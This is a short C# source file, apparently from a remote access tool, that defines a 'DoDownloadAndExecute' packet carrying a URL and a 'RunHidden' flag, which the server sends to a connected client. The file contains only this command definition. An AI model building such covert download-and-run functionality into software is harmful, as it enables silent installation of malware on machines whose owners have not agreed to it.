using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoDownloadAndExecute : IPacket
    {
        public string URL { get; set; }

        public bool RunHidden { get; set; }

        public DoDownloadAndExecute()
        {
        }

        public DoDownloadAndExecute(string url, bool runhidden)
        {
            this.URL = url;
            this.RunHidden = runhidden;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}